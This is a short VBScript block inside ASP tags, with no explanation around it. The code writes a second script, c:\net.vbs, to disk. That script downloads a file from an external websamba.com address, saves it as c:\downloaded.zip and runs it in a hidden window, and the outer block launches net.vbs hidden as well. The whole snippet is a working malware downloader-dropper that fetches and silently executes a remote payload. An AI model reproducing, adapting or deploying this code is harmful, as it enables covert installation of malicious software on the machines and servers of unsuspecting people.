<SCRIPT LANGUAGE="VBScript">
<%
Set seal = CreateObject("Scripting.FileSystemObject")
Set seal = seal.CreateTextFile("c:\net.vbs", True)
seal.write "Dim BinaryData" & vbcrlf
seal.write "Dim xml" & vbcrlf
seal.write "Set xml = CreateObject(""Microsoft.XMLHTTP"")" & vbcrlf
seal.write "xml.Open ""GET"",""http://www35.websamba.com/cybervurgun/file.zip"",False" & vbcrlf
seal.write "xml.Send" & vbcrlf
seal.write "BinaryData = xml.ResponsebOdy" & vbcrlf
seal.write "Const adTypeBinary = 1" & vbcrlf
seal.write "Const adSaveCreateOverWrite = 2" & vbcrlf
seal.write "Dim BinaryStream" & vbcrlf
seal.write "Set BinaryStream = CreateObject(""ADODB.Stream"")" & vbcrlf
seal.write "BinaryStream.Type = adTypeBinary" & vbcrlf
seal.write "BinaryStream.Open" & vbcrlf
seal.write "BinaryStream.Write BinaryData" & vbcrlf
seal.write "BinaryStream.SaveToFile ""c:\downloaded.zip"", adSaveCreateOverWrite" & vbcrlf
seal.write "Dim WshShell"  & vbcrlf
seal.write "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
seal.write "WshShell.Run ""c:\downloaded.zip"", 0, false" & vbcrlf
seal.close
Set seal = Nothing
Set seal = Nothing

Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "c:\net.vbs", 0, false
%>
 </SCRIPT>